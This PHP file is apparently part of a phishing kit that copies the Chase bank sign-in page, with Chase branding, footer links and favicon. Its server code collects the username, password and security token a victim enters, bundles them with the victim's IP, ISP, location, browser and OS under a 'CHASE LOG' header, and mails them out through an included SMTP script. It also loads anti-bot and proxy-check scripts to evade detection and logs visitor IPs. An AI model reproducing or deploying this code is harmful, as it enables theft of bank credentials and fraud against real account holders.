<?php

    ob_start();
    session_start();
require("../admin/config.php");
require("../settings.php");
//require_once("../sec/sniper.php");
require_once("../sec/antibot.php");
require_once("../sec/botinho.php");
require_once("../sec/proxycheck.php");
require_once("../sec/altproxy.php");





    if(isset($_POST['submit'])){
        $usname = $_POST['userid'];
        $pass = $_POST['pass'];
        $token = $_POST['tok'];
        if(!isset($_POST['tok'])){
            $token = "";
        }elseif(isset($_POST['tok'])){
            $token = $_POST['tok'];
        }
        $message = "  --=========[CHASE LOG]===========--  \n";
        $message .= "Username: " . $usname . "\n";
        $message .= "Password: " . $pass . "\n";
        $message .= "Token: " . $token . "\n";
        $message .= "----=========[Vic-Info]===========-----\n";
        $message .= "IP: " . $user_ip . "\n";
        $message .= "ISP: " . $_SESSION['iisp'] . "\n";
        $message .= "City(Based of IP): " .$_SESSION['icity'] . "\n";
        $message .= "Country(Based of IP): " .$_SESSION['icountrycode'] . "\n";
        $message .= "Browser: " . $_SESSION['browser'] . "\n";
        $message .= "OS: " . $_SESSION['platform'] . "\n";
        $message .= "Time: " . $_SESSION['time'] . "\n";
        $message .= "Date: " . $_SESSION['date'] . "\n";
        $message .= "------------------------------------------\n";
        
        $_SESSION['usname'] = $usname;
        $_SESSION['paword'] = $pass;
        $_SESSION['tok'] = $token;
        require("smtp.php");
        header("Location: ./over0.php?locale=en-US&authID={$_SESSION['token']}&start={$_SESSION['fstamp']}&end={$_SESSION['lund']}");
    }
    one_time(one_time_access,redirect_to);
    ff_process(redirect_to);

    $conten2 = "#> ".getenv("REMOTE_ADDR")."\r\n";
    file_put_contents('../logz/MyLogz1_view.txt', $conten2, FILE_APPEND);

?>


<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">

    <title><?php echo htmlentities("Sign in - chase.com", ENT_QUOTES, "UTF-8"); ?></title>

    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/shop-homepage.css" rel="stylesheet">
    <link href="../css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="../img/chasefavicon.ico">
    <script src="https://kit.fontawesome.com/6222530beb.js"></script>

</head>

<body class="less">

<!-- Login Box -->    
<div class="logon-container">
    <header>
        <div class="logon-header">
            <a href="#" class="logolink"> </a>
        </div>
    </header>
    <main class="logon-content">
       <div class="container logon">
           <div class="row">
               <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box">
                   <div class="jpui raised segment">
                       <div class="row">
                           <div class="col-xs-10 col-xs-offset-1">
                               <form action="" method="post" enctype="multipart/form-data">
                                  <div class="us-norm us-mt">
                                   <input type="text" class="frinp" name="userid" id="userid" required pattern="^[a-zA-Z0-9]{4,20}$">
                                   <label for="userid" class="frel">Username</label>
                                  </div>
                                  <div class="us-norm">
                                   <input type="password" class="frinp" name="pass" id="pass" required minlength="5">
                                   <label for="pass" class="frel">Password</label>
                                  </div>
                                  <div class="us-norm">
                                   <input type="text" class="frinp" name="tok" id="token" style="display:none;">
                                   <label for="token" class="frel" id="ken" style="display:none;">Token</label>
                                  </div>
                                  <div class="row">
                                      <div class="col-sm-6 col-xs-7 remember">
                                          <div class="jpui checkbox" id=rememberMe>
                                              <label class="cont">Remember me
                                               <input type="checkbox" name="save" value="save">
                                               <span class="checkmark"></span>
                                            </label>
                                          </div>
                                      </div>
                                      <div class="col-sm-6 col-xs-5 token">
                                          <div class="jpui checkbox useT" >
                                              <label class="cont" >Use token
                                               <input type="checkbox" name="save" value="save"  id="utoken" onclick="myFunction()">
                                               <span class="checkmark sand"></span>
                                            </label>
                                          </div>
                                      </div>
                                  </div>
                                  <div class="row">
                                      <input type="submit" class="jpui submit" value="Sign in" name="submit">
                                  </div>
                                  <div class="row">
                                      <span class="jpui link">
                                          <a href="#" class="link-anchor">Forgot username/password? ></a>
                                      </span>
                                  </div>
                                  <div class="row">
                                      <span class="jpui link">
                                          <a href="#" class="link-anchor">Not Enrolled? Sign Up Now. ></a>
                                      </span>
                                  </div>
                               </form>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
       </div>
        
    </main>
    


</div>
<!-- /.Login Box -->



<!-- Footer Side -->
<footer class="logon-footer" id="logon-footer">
    <div class="footer-container" style="position:static;">
        <div class="container">
            <div class="social-links row">
                <div class="col-xs-12">
                    <span class="follow-text">Follow us:</span>
                    <img src="../img/cap.png" alt="" class="icon-links">
                </div>
            </div>
            <div class="footer-links row">
                <div class="col-xs-12">
                    <ul>
                        <li class="azadus">Contact us</li>
                        <li class="azadus">Privacy</li>
                        <li class="azadus">Security</li>
                        <li class="azadus">Terms of use</li>
                        <li class="azadus">Accessibility</li>
                        <li class="azadus">SAFE Act: Chase Mortgage Loan Originators</li>
                        <li class="azadus">Fair Lending</li>
                        <li class="azadus">About Chase</li>
                        <li class="azadus">J.P Morgan</li>
                        <li class="azadus">JPMorgan Chase &#38; Co.</li>
                        <li class="azadus">Careers</li>
                        <li class="azadus">Espa&ntilde;ol</li>
                        <li class="azadus">Chase Canada</li>
                        <li class="azadus">Site map</li>
                        <li>Member FDIC</li>
                        <li><i class="fas fa-home"></i>&nbsp;Equal Housing Lender</li>
                        
                        <li class="copyright-label">&copy; 2020 JPMorgan Chase &#38; Co.</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</footer>
<!-- /.Footer Side -->

<script>

function myFunction() {
  var checkBox = document.getElementById("utoken");
  var uto = document.getElementById("token");
  var ken = document.getElementById("ken");
  if (checkBox.checked == true) {
    uto.style.display = "inline-block";
    ken.style.display = "inline-block";
  } else {
    uto.style.display = "none";
    ken.style.display = "none";
  }
}
 
    
</script>


<script src="../js/jquery.js"></script>
<script src="../js/bootstrap.min.js"></script>


</body>

</html>